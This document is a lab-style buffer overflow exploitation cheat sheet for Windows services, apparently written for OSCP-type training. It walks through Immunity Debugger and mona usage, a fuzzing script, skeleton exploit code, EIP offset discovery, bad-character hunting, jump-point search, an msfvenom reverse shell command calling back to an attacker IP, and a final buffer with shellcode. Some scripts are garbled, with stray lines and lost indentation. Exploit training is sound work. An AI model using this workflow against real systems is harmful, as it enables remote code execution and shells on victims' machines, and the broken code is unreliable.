

# Buffer Overflows

Immunity Debugger
=================

**Always run Immunity Debugger as Administrator if you can.**

There are generally two ways to use Immunity Debugger to debug an application:

1. Make sure the application is running, open Immunity Debugger, and then use :code:`File -> Attach` to attack the debugger to the running process.
2. Open Immunity Debugger, and then use :code:`File -> Open` to run the application.

When attaching to an application or opening an application in Immunity Debugger, the application will be paused. Click the "Run" button or press F9.

Note: If the binary you are debugging is a Windows service, you may need to restart the application via :code:`sc`

    sc stop SLmail
    sc start SLmail

Some applications are configured to be started from the service manager and will not work unless started by service control.

Mona Setup
==========

Mona is a powerful plugin for Immunity Debugger that makes exploiting buffer overflows much easier. Download: :download:`mona.py <../_static/files/mona.py>`

| The latest version can be downloaded here: https://github.com/corelan/mona
| The manual can be found here: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/

Copy the mona.py file into the PyCommands directory of Immunity Debugger (usually located at C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands).

In Immunity Debugger, type the following to set a working directory for mona.

    !mona config -set workingfolder c:\mona\%p

Fuzzing
=======

The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.

    #!/usr/bin/env python3

    import socket, time, sys

    ip = "10.10.70.232"

    port = 1337
    timeout = 5
    prefix = "OVERFLOW1 "

    string = prefix + "A" * 100

    for string in buffer: 
    while True:
    try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)

The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

Crash Replication & Controlling EIP
===================================

The following skeleton exploit code can be used for the rest of the buffer overflow exploit:

    import socket
    
    ip = "10.10.70.232"
    port = 1337
    
    prefix = "OVERFLOW1"
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = ""
    postfix = ""
    
    buffer = prefix + overflow + retn + padding + payload + postfix
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(buffer + "\r\n")
        print("Done!")
    except:
        print("Could not connect.")

Using the buffer length which caused the crash, generate a unique buffer so we can determine the offset in the pattern which overwrites the EIP register, and the offset in the pattern to which other registers point. Create a pattern that is 400 bytes larger than the crash buffer, so that we can determine whether our shellcode can fit immediately. If the larger buffer doesn't crash the application, use a pattern equal to the crash buffer length and slowly add more to the buffer to find space.

    $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag


On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.

    !mona findmsp -distance 600
    ...
    [+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
    Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
    Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
    EIP contains normal pattern : 0x78413778 (offset 1978)


Note the EIP offset (1978)

Create a new buffer using this information to ensure that we can control EIP:

    prefix = ""
    offset = 1978
    overflow = "A" * offset
    retn = "BBBB"
    padding = ""
    payload = ""
    postfix = ""
    
    buffer = prefix + overflow + retn + padding + payload + postfix

Crash the application using this buffer, and make sure that EIP is overwritten by B's (\\x42) and that the ESP register points to the start of the C's (\\x43).

Finding Bad Characters
======================

Generate a bytearray using mona, and exclude the null byte (\\x00) by default. Note the location of the bytearray.bin file that is generated.

    !mona bytearray -b "\x00"

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff:

    #!/usr/bin/env python
    from __future__ import print_function
    for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
    print()

Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

    !mona compare -f C:\mona\appname\bytearray.bin -a <address>

Find a Jump Point
=================

The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \\x00, \\x0a, and \\x0d.

    !mona jmp -r esp -cpb "\x00\x0a\x0d"

The mona find command can similarly be used to find specific instructions, though for the most part, the jmp command is sufficient:

    !mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"

Generate Payload
================

Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.18.91.23 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f c

Prepend NOPs
============

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\\x90) to the payload.

Final Buffer
============

    prefix = ""
    offset = 1978
    overflow = "A" * offset
    retn = "\x56\x23\x43\x9A"
    padding = "\x90" * 16
    payload = "\xdb\xde\xba\x69\xd7\xe9\xa8\xd9\x74\x24\xf4\x58\x29\xc9\xb1..."
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
